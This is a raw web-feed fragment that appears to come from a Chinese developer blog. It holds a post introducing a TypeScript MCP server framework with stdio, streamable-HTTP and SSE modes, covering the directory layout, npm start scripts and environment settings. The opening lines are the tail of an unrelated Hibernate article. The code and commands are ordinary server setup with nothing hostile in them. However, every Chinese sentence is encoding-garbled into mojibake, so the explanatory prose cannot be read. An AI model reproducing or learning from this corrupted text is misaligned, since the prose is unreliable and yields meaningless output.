<p>é€šè¿‡è¿™äº›æ–¹æ³•ï¼Œå¯ä»¥æ˜¾è‘—æé«˜Hibernateåº”ç”¨ç¨‹åºçš„æ‰¹é‡åˆ é™¤æ€§èƒ½ã€‚å¸Œæœ›è¿™äº›è¯¦ç»†çš„è§£é‡Šå’Œä»£ç ç¤ºä¾‹èƒ½å¸®åŠ©æ‚¨æ›´å¥½åœ°ç†è§£å’Œåº”ç”¨Hibernateçš„æ‰¹é‡åˆ é™¤æŠ€æœ¯ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ã€MCPã€‘åŒæ—¶æ”¯æŒstdioï¼ŒstreamableHttplesså’Œsseä¸‰ç§åè®®çš„MCPæœåŠ¡æ¡†æ¶]]></title>    <link>https://juejin.cn/post/7597623392456097843</link>    <guid>https://juejin.cn/post/7597623392456097843</guid>    <pubDate>2026-01-21T09:38:31.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597623392456097843" data-draft-id="7597622924272173083" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ã€MCPã€‘åŒæ—¶æ”¯æŒstdioï¼ŒstreamableHttplesså’Œsseä¸‰ç§åè®®çš„MCPæœåŠ¡æ¡†æ¶"/> <meta itemprop="keywords" content="ç¨‹åºå‘˜"/> <meta itemprop="datePublished" content="2026-01-21T09:38:31.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="äº¬ä¸œäº‘å¼€å‘è€…"/> <meta itemprop="url" content="https://juejin.cn/user/2634854380340008"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ã€MCPã€‘åŒæ—¶æ”¯æŒstdioï¼ŒstreamableHttplesså’Œsseä¸‰ç§åè®®çš„MCPæœåŠ¡æ¡†æ¶
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2634854380340008/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    äº¬ä¸œäº‘å¼€å‘è€…
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-21T09:38:31.000Z" title="Wed Jan 21 2026 09:38:31 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-21
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>ä½œè€…ï¼šè”¡æ¬£å½¤</p>
<h2 data-id="heading-0">é¡¹ç›®è¯´æ˜</h2>
<p>è¿™æ˜¯ä¸€ä¸ªåŒæ—¶æ”¯æŒstdioï¼ŒstreamableHttplesså’Œsseä¸‰ç§åè®®çš„MCP-Serverçš„æ¡†æ¶ï¼ˆtsè¯­è¨€ï¼‰ã€‚</p>
<p>ä¸ºä»€ä¹ˆæˆ‘æƒ³åšè¿™ä¸ªæ¡†æ¶å‘¢ï¼Ÿå› ä¸ºéšç€AIå‘å±•ï¼Œç°åœ¨è¶Šæ¥è¶Šå¤šä¸šåŠ¡éœ€è¦å’ŒAIç›¸ç»“åˆã€‚è€Œæˆ‘åœ¨åšAIåº”ç”¨ä¸­å‘ç°ï¼ŒMCPæœåŠ¡åœ¨AIæ–¹å‘çš„ä¸šåŠ¡ä½¿ç”¨é¢‘ç‡å¾ˆé«˜ï¼Œä½†éšç€ä¸šåŠ¡çš„åŠ æ·±ï¼Œå‘ç°å­˜åœ¨ä»¥ä¸‹ç—›ç‚¹ï¼š</p>
<p>1.é’ˆå¯¹ä¸åŒä¸šåŠ¡ï¼Œå¯¹äºmcp-serveréœ€è¦çš„ç±»å‹ä¸åŒï¼Œæœ‰çš„å°±éœ€è¦stdioï¼Œæœ‰çš„éœ€è¦ç½‘ç»œè¯·æ±‚</p>
<p>2.ä¸åŒå¹³å°å¯¹MCPæœåŠ¡åè®®è¦æ±‚ä¸åŒï¼Œæœ‰æ”¯æŒstreamableHttpï¼Œæœ‰ä»…æ”¯æŒsseçš„ã€‚</p>
<p>è¿™ä¸¤ç§æƒ…å†µï¼Œä¼šå‡ºç°ç›¸åŒåŠŸèƒ½é‡å¤å¼€å‘ï¼Œé‡å¤é€ è½®å­ï¼Œæµªè´¹æ—¶é—´æˆæœ¬</p>
<ol start="3">
<li>æ­¤å¤–ï¼Œæœ‰äº›ç ”å‘äººå‘˜ç›®å‰å¹¶ä¸äº†è§£MCPï¼Œåœ¨ä¸šåŠ¡å¼€å‘æ—¶å€™éœ€è¦ç°å­¦</li>
</ol>
<p>è€Œè¿™ä¼šè®©ç ”å‘å‘¨æœŸåŠ é•¿ï¼Œæ—¶é—´æˆæœ¬è€—è´¹è¿‡å¤š</p>
<p>æ‰€ä»¥ä¸ºäº†è§£å†³ä»¥ä¸Šç—›ç‚¹ï¼Œæˆ‘ä»0-1æ­å»ºäº†è¿™ä¸ªæ¡†æ¶ã€‚<strong>è¿™ä¸ªæ¡†æ¶ç‰¹ç‚¹</strong>ï¼š</p>
<p>1.åŒæ—¶æ”¯æŒstdioï¼ŒstreamableHttplesså’Œsseä¸‰ç§æ¨¡å¼ï¼Œå®ç°ä¸€æ¬¡å¼€å‘æ”¯æŒä¸‰ç§æ¨¡å¼</p>
<p>2.æ‰€æœ‰åŠŸèƒ½éƒ½æ‹†åˆ†ä¸ºç‹¬ç«‹æ¨¡å—ã€‚è¿™æ ·å³ä½¿ä¸æ‡‚çš„äººï¼Œåªè¦åœ¨æŒ‡å®šçš„æ–‡ä»¶é‡Œé¢ç¼–å†™ä¸šåŠ¡é€»è¾‘ï¼Œå°±å¯ä»¥åˆ›é€ è‡ªå·±çš„mcpæœåŠ¡</p>
<p>3.æ”¯æŒç¯å¢ƒå˜é‡ï¼Œå¯é€šè¿‡ç¯å¢ƒå˜é‡é…ç½®åŸŸåï¼ŒæœåŠ¡åœ°å€ï¼Œç«¯å£å’Œhostï¼ŒçœŸæ­£é€‚ç”¨äºç”Ÿäº§ä½¿ç”¨</p>
<p>4.åˆ‡æ¢æ¨¡å¼ä¹Ÿå¾ˆç®€å•ï¼Œåªè¦åœ¨å¯åŠ¨è„šæœ¬æ ¹æ®éœ€è¦ï¼Œåˆ‡æ¢å¯åŠ¨å‘½ä»¤å³å¯ï¼Œæ”¹åŠ¨æˆæœ¬è¿‘ä¹æ— </p>
<p>5.æ·»åŠ æ—¥å¿—æ¨¡å—ï¼Œæ–¹ä¾¿æŸ¥é˜…å¯åŠ¨å’ŒæœåŠ¡è°ƒç”¨æƒ…å†µ</p>
<p>6.åŒæ—¶æ·»åŠ è¡Œäº‘è„šæœ¬ï¼Œæ”¯æŒè¡Œäº‘éƒ¨ç½²</p>
<p>githubåœ°å€ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FXingtongCai%2Fmcp-server-ts" target="_blank" title="https://github.com/XingtongCai/mcp-server-ts" ref="nofollow noopener noreferrer">github.com/XingtongCaiâ€¦</a>ï»¿</p>
<p>codingåœ°å€ï¼š <a href="https://link.juejin.cn?target=http%3A%2F%2Fxingyun.jd.com%2FcodingRoot%2Fjdcloud-fe%2Fmcp-server%2Ftree%2Fmain%2Fdemo" target="_blank" title="http://xingyun.jd.com/codingRoot/jdcloud-fe/mcp-server/tree/main/demo" ref="nofollow noopener noreferrer">xingyun.jd.com/codingRoot/â€¦</a></p>
<h2 data-id="heading-1">å†…å®¹ä»‹ç»</h2>
<p>æ•´ä¸ªæ¡†æ¶çš„ç»“æ„å¾ˆç®€å•ï¼Œå°±å¦‚ä¸‹è¿™äº›ï¼š</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-comment">## ç›®å½•ç»“æ„</span>
<span class="hljs-bullet">-</span> <span class="hljs-attr">build:</span> <span class="hljs-string">ç¼–è¯‘ä¹‹åçš„æ–‡ä»¶</span>
<span class="hljs-bullet">-</span> <span class="hljs-string">src</span>
 <span class="hljs-string">--</span> <span class="hljs-attr">router:</span> <span class="hljs-string">é…ç½®streamableHttpå’Œsseåè®®çš„è·¯ç”±</span>
   <span class="hljs-string">--</span> <span class="hljs-attr">index.ts:</span> <span class="hljs-string">æ³¨å†ŒstreamableHttpè·¯ç”±å…¥å£</span>
   <span class="hljs-string">--</span> <span class="hljs-attr">mcp.ts:</span> <span class="hljs-string">streamableHttpçš„é…ç½®è·¯å¾„ï¼Œå…·ä½“ä¸º`process.env.MCP_BASE_PATH`çš„è·¯å¾„è¯·æ±‚,å¦‚æœæ²¡æœ‰é…ç½®ï¼Œé»˜è®¤/mcpã€‚å¦‚æœæœ‰éœ€è¦æ·»åŠ äºŒçº§è·¯å¾„ï¼Œä¾‹å¦‚</span> <span class="hljs-string">/mcp/eventï¼Œéœ€è¦åœ¨è¿™é‡Œé¢æ·»åŠ ä¸€ä¸‹/event,å¦‚æœä¸€çº§ä¸ç”¨åŠ¨</span>
   <span class="hljs-string">--</span> <span class="hljs-attr">sse.ts:</span> <span class="hljs-string">sseçš„é…ç½®è·¯å¾„ï¼Œå…·ä½“ä¸º`process.env.MCP_BASE_PATH`çš„è·¯å¾„è¯·æ±‚,å¦‚æœæ²¡æœ‰é…ç½®ï¼Œé»˜è®¤/mcpã€‚å¦‚æœæœ‰éœ€è¦æ·»åŠ äºŒçº§è·¯å¾„ï¼Œä¾‹å¦‚</span> <span class="hljs-string">/mcp/eventï¼Œéœ€è¦åœ¨è¿™é‡Œé¢æ·»åŠ ä¸€ä¸‹/event,å¦‚æœä¸€çº§ä¸ç”¨åŠ¨</span>
 <span class="hljs-string">--</span> <span class="hljs-attr">tools:</span> <span class="hljs-string">mcpçš„å·¥å…·</span> 
   <span class="hljs-string">--</span> <span class="hljs-attr">index.ts:</span> <span class="hljs-string">æ³¨å†Œå·¥å…·</span>
   <span class="hljs-string">--</span> <span class="hljs-attr">mockFunc.ts:</span> <span class="hljs-string">æ¨¡æ‹Ÿä¸€ä¸ªå·¥å…·å†™æ³•</span> <span class="hljs-bullet">-</span> <span class="hljs-string">è¿™éƒ¨åˆ†éœ€è¦æ ¹æ®ä¸šåŠ¡å¼€å‘</span>
 <span class="hljs-string">--</span> <span class="hljs-attr">cli.ts:</span> <span class="hljs-string">å‘½ä»¤è¡Œè§£æå·¥å…·</span>
 <span class="hljs-string">--</span> <span class="hljs-attr">index.ts:</span> <span class="hljs-string">æ€»å…¥å£</span>
 <span class="hljs-string">--</span> <span class="hljs-attr">server.ts:</span> <span class="hljs-string">åˆ›å»ºMcpæœåŠ¡</span>
 <span class="hljs-string">--</span> <span class="hljs-attr">sse.ts:</span> <span class="hljs-string">è¿è¡Œsseæ¨¡å¼</span>
 <span class="hljs-string">--</span> <span class="hljs-attr">stdio.ts:</span> <span class="hljs-string">è¿è¡Œstdioæ¨¡å¼</span>
 <span class="hljs-string">--</span> <span class="hljs-attr">streamableHttp.ts:</span> <span class="hljs-string">è¿è¡ŒstreamableHttpæ¨¡å¼</span>
<span class="hljs-bullet">-</span> <span class="hljs-attr">xingyun/bin :</span> <span class="hljs-string">æ˜¯æ ¹æ®æˆ‘ä»¬ä¸šåŠ¡ä½¿ç”¨çš„éƒ¨ç½²å·¥å…·å¼€å‘çš„éƒ¨ç½²è„šæœ¬</span> <span class="hljs-bullet">-</span> <span class="hljs-string">è¿™éƒ¨åˆ†éœ€è¦æ ¹æ®å®é™…éƒ¨ç½²å¹³å°æ›´æ”¹ï¼Œæˆ‘è¿™ä¸ªæ”¯æŒè¡Œäº‘éƒ¨ç½²</span>
<span class="hljs-bullet">-</span> <span class="hljs-attr">build_xingyun.sh:</span> <span class="hljs-string">æ˜¯æ ¹æ®æˆ‘ä»¬ä¸šåŠ¡ä½¿ç”¨çš„éƒ¨ç½²å·¥å…·å¼€å‘çš„éƒ¨ç½²è„šæœ¬</span> <span class="hljs-bullet">-</span> <span class="hljs-string">è¿™éƒ¨åˆ†éœ€è¦æ ¹æ®å®é™…éƒ¨ç½²å¹³å°æ›´æ”¹ï¼Œæˆ‘è¿™ä¸ªæ”¯æŒè¡Œäº‘éƒ¨ç½²</span>
</code></pre>
<h3 data-id="heading-2">å¯åŠ¨æœåŠ¡æ–¹å¼</h3>
<p>a.æœ¬åœ°å¯åŠ¨</p>
<p>1.å¯åŠ¨stdio: npm run start æ˜¯é»˜è®¤å¯åŠ¨stdio</p>
<p>2.å¯åŠ¨StreamableHttp: npm run start:http æ˜¯é»˜è®¤å¯åŠ¨ç«¯å£3001</p>
<p>3.æ›´æ”¹ç«¯å£å¯åŠ¨StreamableHttp: npm run dev:http æˆ–è€… npm run start -- -t http -p 3001</p>
<p>-t httt: ä»£è¡¨å¯åŠ¨StreamableHttp</p>
<p>-p 3001: ä»£è¡¨å¯åŠ¨ç«¯å£3001</p>
<p>4.å¯åŠ¨sse: npm run start:sse æ˜¯é»˜è®¤å¯åŠ¨ç«¯å£3001</p>
<p>ï»¿</p>
<p>b.éƒ¨ç½²å¯åŠ¨</p>
<p>æˆ‘åœ¨ xingyun/bin/control.shä¸­å†™çš„å¯åŠ¨è„šæœ¬ï¼Œè¿™æ®µä»£ç æ˜¯å¯åŠ¨streamableHttplessçš„ï¼Œå¦‚æœéœ€è¦å¯åŠ¨sseï¼Œéœ€è¦æ”¹ä¸º <code>npm run start:sse</code></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-title function_">start</span>(<span class="hljs-params"/>){
    npm run <span class="hljs-attr">start</span>:http
    sleep <span class="hljs-number">3</span>
    status
}
</code></pre>
<h3 data-id="heading-3">ç”Ÿäº§ç¯å¢ƒé…ç½®</h3>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># ç›‘å¬ç‰¹å®šå†…ç½‘IPï¼ˆä¾‹å¦‚ï¼š192.168.1.100ï¼‰</span>
export <span class="hljs-attr">MCP_HOST</span>=<span class="hljs-number">192.168</span>.<span class="hljs-number">1.100</span>
export <span class="hljs-attr">MCP_PORT</span>=<span class="hljs-number">3001</span>

<span class="hljs-comment"># ä½¿ç”¨å†…ç½‘åŸŸåï¼ˆå¯é€‰ï¼‰</span>
export <span class="hljs-attr">MCP_DOMAIN</span>=mcp-server.internal.com

<span class="hljs-comment"># ä¿®æ”¹åŸºç¡€è·¯å¾„ï¼ˆå¯é€‰ï¼Œé»˜è®¤æ˜¯ /mcpï¼‰</span>
export <span class="hljs-attr">MCP_BASE_PATH</span>=/api/mcp
</code></pre>

<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-section">### ç«¯å£é…ç½®ä¼˜å…ˆçº§</span>
<span class="hljs-bullet">1.</span> ç¯å¢ƒå˜é‡ <span class="hljs-code">`MCP_PORT`</span>ï¼ˆæœ€é«˜ä¼˜å…ˆçº§ï¼‰
<span class="hljs-bullet">2.</span> å‘½ä»¤è¡Œå‚æ•° <span class="hljs-code">`--port`</span> 
<span class="hljs-bullet">3.</span> é»˜è®¤å€¼ï¼š3001ç«¯å£

<span class="hljs-section">### è®¿é—®åœ°å€ä¼˜å…ˆçº§</span>
<span class="hljs-bullet">1.</span> ç¯å¢ƒå˜é‡ <span class="hljs-code">`MCP_DOMAIN`</span>ï¼ˆæœ€é«˜ä¼˜å…ˆçº§ï¼‰
<span class="hljs-bullet">2.</span> ç¯å¢ƒå˜é‡ <span class="hljs-code">`MCP_HOST`</span>
<span class="hljs-bullet">3.</span> é»˜è®¤: localhost
</code></pre>

<pre><code class="hljs language-perl" lang="perl"><span class="hljs-comment">### å†…ç½‘è®¿é—®æ–¹å¼</span>
å‡è®¾ä½ çš„å†…ç½‘æœåŠ¡å™¨IPæ˜¯ <span class="hljs-string">`192.168.1.100`</span>ï¼Œç«¯å£æ˜¯ <span class="hljs-string">`3001`</span>ï¼š

**åŸºç¡€è®¿é—®ï¼š**
<span class="hljs-string">``</span><span class="hljs-string">`
http://192.168.1.100:3001/sales
`</span><span class="hljs-string">``</span>

**å¸¦åŸŸåçš„è®¿é—®ï¼š**
<span class="hljs-string">``</span><span class="hljs-string">`
http://mcp-server.internal.com/sales
`</span><span class="hljs-string">``</span>

**è‡ªå®šä¹‰è·¯å¾„ï¼š**
<span class="hljs-string">``</span><span class="hljs-string">`
http://192.168.1.100:3001/api/mcp
</span></code></pre>
<p>ï»¿</p>
<h2 data-id="heading-4">é¡¹ç›®å…³é”®ä»£ç è¯´æ˜</h2>
<p>è¿™ä¸ªæ˜¯package.jsonæ–‡ä»¶ï¼Œä¹Ÿæ˜¯æˆ‘ä»¬ä¸€å¼€å§‹è¦çœ‹çš„ï¼Œ<code>cli.js</code>è¿™ä¸ªæ–‡ä»¶æ˜¯æˆ‘ä»¬å¯åŠ¨æ–‡ä»¶ï¼Œä¹Ÿæ˜¯è§£æå‘½ä»¤è¡Œçš„å·¥å…·ï¼ŒçœŸå®åŒºåˆ†çš„åœ°æ–¹åœ¨index.tsæ–‡ä»¶ä¸­</p>
<pre><code class="hljs language-perl" lang="perl"><span class="hljs-string">"scripts"</span>: {
    <span class="hljs-string">"build"</span>: <span class="hljs-string">"tsc &amp;&amp; chmod 755 build/src/index.js  build/src/cli.js"</span>,
    <span class="hljs-string">"start"</span>: <span class="hljs-string">"node ./build/src/cli.js"</span>,
    <span class="hljs-string">"start:http"</span>: <span class="hljs-string">"node ./build/src/cli.js --transport http"</span>,
    <span class="hljs-string">"start:sse"</span>: <span class="hljs-string">"node ./build/src/cli.js --transport sse"</span>,
    <span class="hljs-string">"dev:http"</span>: <span class="hljs-string">"node ./build/src/cli.js  --transport http --port 3002"</span>,
    <span class="hljs-string">"stop"</span>: <span class="hljs-string">"pkill -f "</span>demo<span class="hljs-string">" || true"</span>,
    <span class="hljs-string">"restart"</span>: <span class="hljs-string">"npm run stop &amp;&amp; npm run start:http"</span>,
    <span class="hljs-string">"inspector"</span>: <span class="hljs-string">"npx @modelcontextprotocol/inspector"</span>
  },
</code></pre>
<p>index.ts çš„å…³é”®ä»£ç ï¼Œåœ¨è¿™åŒºåˆ†ä¸åŒæ¨¡å¼ï¼Œç„¶åè¿›å…¥åˆ°å„è‡ªçš„å¤„ç†æ¨¡å—ã€‚å„è‡ªæ¨¡å—å°±æ˜¯è°ƒç”¨sdkï¼Œé…ç½®åŸŸåç­‰æ“ä½œï¼Œä»£ç è¿‡é•¿ï¼Œä¸å±•ç¤ºäº†ï¼Œä½†æ˜¯è¿™å‡ ä¸ªæ–‡ä»¶ä¸ç”¨åŠ¨ã€‚</p>
<p>ï»¿</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a2cb41c9ab1f43cb8003b7a55d2da5c2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lqs5Lic5LqR5byA5Y-R6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769593110&amp;x-signature=64U%2F63owQPqDg1qCgGtuIPgfhxo%3D" alt="" loading="lazy"/></p>
<p>ï»¿ï»¿</p>
<p>StreamableHttp.tsæˆ‘æ”¯æŒçš„æ˜¯lessï¼Œå°±æ˜¯æˆ‘ä¸éœ€è¦sessionIdï¼Œå¦‚æœæœ‰éœ€è¦çš„ï¼Œè¿™å—éœ€è¦å†è‡ªå·±æ”¹ä¸€ä¸‹ï¼ï¼</p>
<p>ï»¿</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/58a67479b3744fc28cc4a9c8305cc833~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lqs5Lic5LqR5byA5Y-R6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769593110&amp;x-signature=k%2B243HbNiZoeP%2BqTorir43ZVMuc%3D" alt="" loading="lazy"/></p>
<p>ï»¿ï»¿</p>
<p>server.ts æ˜¯åˆ›å»ºmcpæœåŠ¡ï¼ŒåŒæ—¶æ³¨å†Œtoolså·¥å…·ï¼Œä¸‰ä¸ªæ¨¡å¼éƒ½éœ€è¦ä½¿ç”¨çš„å…¬å…±æ–‡ä»¶</p>
<p>ï»¿</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/17c4017b136d43069edeba04b3594350~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lqs5Lic5LqR5byA5Y-R6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769593110&amp;x-signature=3eRQhTFVg%2B817b1%2BTCIUuYZ7SIo%3D" alt="" loading="lazy"/></p>
<p>ï»¿ï»¿</p>
<p>tools/index.ts, ä½œä¸ºå·¥å…·å…¥å£ï¼Œä¸€ä¸ªå·¥å…·ä¸€ä¸ªæ³¨å†Œ</p>
<p>ï»¿</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0b96c33a7fe4427cb0e3c145ff461fae~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lqs5Lic5LqR5byA5Y-R6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769593110&amp;x-signature=rkr6hZiO51D5UWcGFAcXoGPfM2E%3D" alt="" loading="lazy"/></p>
<p>ï»¿ï»¿</p>
<p>routeræ–‡ä»¶å¤¹ä¸‹è·¯ç”±æ³¨å†Œï¼Œæ˜¯ä¸ºäº†sseå’Œstreamablelessçš„è·¯ç”±ã€‚</p>
<p>ï»¿</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a54b087acf6049cfa6e3270caab3c9a3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lqs5Lic5LqR5byA5Y-R6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769593110&amp;x-signature=uqe0GB8Ka8nH8BAuauwi7Jvdkoc%3D" alt="" loading="lazy"/></p>
<p>ï»¿ï»¿</p>
<p>å…¶ä¸­streamableçš„index.tsæ–‡ä»¶é‡Œé¢å…³é”®å†…å®¹ï¼Œå…¶ä¸­basePathå°±æ˜¯ä½ çš„åŸºç¡€è·¯å¾„ï¼Œé€šè¿‡å®šä¹‰æŒ‡å®šè®¿é—®è·¯å¾„ã€‚</p>
<p>ï»¿</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cd93c0f813104a1fad1cc790fe568a3a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lqs5Lic5LqR5byA5Y-R6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769593110&amp;x-signature=k6y2m1pt%2BY5OtJtRD6Xr2dZumuo%3D" alt="" loading="lazy"/></p>
<p>ï»¿ï»¿</p>
<p>sseçš„åœ¨sse.tsæ–‡ä»¶ä¸­ï¼Œå®šä¹‰äº†getå’Œpostçš„æ–¹æ³•</p>
<p>ï»¿</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3bce4f93d2304ef68d7ea0307a16deb8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lqs5Lic5LqR5byA5Y-R6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769593110&amp;x-signature=%2BF9p0GfSAE%2BlA%2F%2FPKCRJhCLA3sI%3D" alt="" loading="lazy"/></p>
<p>ï»¿ï»¿</p>
